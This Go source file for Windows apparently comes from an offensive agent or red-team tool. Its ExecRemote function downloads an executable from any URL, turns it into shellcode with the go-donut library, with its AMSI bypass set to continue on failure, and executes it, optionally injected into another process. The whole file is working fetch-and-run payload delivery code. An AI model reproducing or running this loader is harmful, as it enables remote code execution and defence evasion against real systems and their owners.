// +build windows

package arch

import (
	"bytes"
	"io/ioutil"
	"net/http"

	log "github.com/sirupsen/logrus"

	"github.com/Binject/go-donut/donut"
)

func ExecRemote(url, fileType, argline, injectInto string) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
	log.Infof("Executing from url %s with argument %s into %s",
		url, argline, injectInto)
	fileContent, err := DownloadFile(url)
	if err != nil {
		return nil, nil, 0, 0, err
	}

	shellcode, err := fileToShellcode(fileContent, argline, injectInto)
	if err != nil {
		return nil, nil, 0, 0, err
	}

	stdOut, stdErr, pid, exitCode, err = ExecuteAssembly(shellcode, injectInto)
	if err != nil {
		return nil, nil, 0, 0, err
	}

	return stdOut, stdErr, pid, exitCode, nil
}

func DownloadFile(url string) ([]byte, error) {
	res, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	d, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return nil, err
	}

	return d, nil
}

func fileToShellcode(fileContent []byte, argline string, injectInto string) ([]byte, error) {
	config := donut.DonutConfig{
		Type:       donut.DONUT_MODULE_NET_EXE,
		InstType:   donut.DONUT_INSTANCE_PIC,
		Parameters: argline,
		//Class:      className,
		//Method:     method,
		Bypass:   3,         // 1=skip, 2=abort on fail, 3=continue on fail.
		Format:   uint32(1), // 1=raw, 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=C#, 8=hex
		Arch:     donut.X84,
		Entropy:  0,         // 1=disable, 2=use random names, 3=random names + symmetric encryption (default)
		Compress: uint32(1), // 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman
		ExitOpt:  1,         // exit thread
		Unicode:  0,
	}

	ss, err := donut.ShellcodeFromBytes(bytes.NewBuffer(fileContent), &config)
	if err != nil {
		return nil, err
	}
	return ss.Bytes(), nil
}
